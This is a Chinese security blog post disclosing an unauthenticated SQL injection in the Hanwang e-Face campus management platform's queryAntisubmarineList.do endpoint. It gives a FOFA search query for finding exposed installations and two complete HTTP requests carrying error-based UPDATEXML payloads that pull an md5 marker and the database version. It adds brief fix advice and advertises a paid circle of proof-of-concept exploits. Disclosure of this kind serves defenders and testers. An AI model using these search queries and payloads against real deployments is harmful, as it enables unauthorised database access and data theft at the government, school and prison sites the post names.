#  汉王e脸通综合管理平台queryAntisubmarineList接口存在sql注入漏洞  
北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-08 01:29  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgYDB1xClzckNAz0dxSpnCAhgmMNwOV2ow78VnejUHqNUATLAkMCFG7fjUGvPRBWspk8WrAlQtHNSvVJS0oTwGhqRGGaQ9yoMA/640?wx_fmt=png&from=appmsg "")  
  
网络安全为人民，网络安全靠人民  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzj01PmIATxia90zt2ulLy9fDaogDp2e97nwYsGjTdU7GgOtAWmDpT4ymxayU7hy6CxvefMiaW4SEF3HdskveMibxE2zsXKT4pXYdo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgtBrqKehQZBZUHXcjp7WgqUVPIiadxPSsUZNoclrah7xTvr1wZ68wKpnV0CL1ibTAXHHYQd5XfH9qEyibuibWysQNnbmFBiawBpCes/640?wx_fmt=png&from=appmsg "")  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjIbXmmJHgWNibSaicN5lBoeibpYz5Lkeq951bQBo8vHKzd4RzOvrzxlZP8IgeD54yusyoO0QnFLIIg8Fa46RXTKtVx7u0jA3nTEA/640?wx_fmt=png&from=appmsg "")  
  
  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa  
：  
icon_hash="1380907357"  
  
  
  
03  
  
漏洞复现  
  
汉王  
e  
脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的  
 queryAntisubmarineList.do   
接口存在  
SQL   
注入漏洞。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意  
 SQL   
语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgf8ZPyJvovelGmVbcgxeUSssbYAy6T5DBD9FGTPdA6SArztDzSSYCZVmL2D3Nm5GWO14os6QiauIDLk9ib1kr8SMtMkbZiaSdk3U/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhlWEYFjO66tiagXFfDs9IdEPHkSTrzMVqvUlX5Tyr91JVTdj34SrCgqibwxe4DUQZQMQtECuWS4cLicxGpzjW1uvAeOBtPkpicgNY/640?wx_fmt=png&from=appmsg "")  
  
```
GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=CC9FEBAD70F26D4E2424B65A74063EF6
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziabAvTsicYrIzY5HE4MWElK6d1NUqSDnkZKic2oyyMDCyEgKGFBDCiaic03yPK1zJRczb7hJcHAvf1OgYzFny0fW2hvmrX2C1s9vBQ/640?wx_fmt=png&from=appmsg "")  
```
GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=CC9FEBAD70F26D4E2424B65A74063EF6
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhvSiaiahywTCLB1D2JYQSbD3lG1HNmTicsZtibicERDEWt59ugp3RIaxHf2c0blZFcmQ9Q3VRXYApcibZ2icBqV9mvP4Pj7I70jWjFMU/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzia3sPY21wPy4AKxvfXAKvQenQJv22auyUM9LLQDfKj4MFHA67VtYoUPuxf6Rr5eKBNBX7YJv7O8icyoa9ic74K7UOiap4QSicHJNfs/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
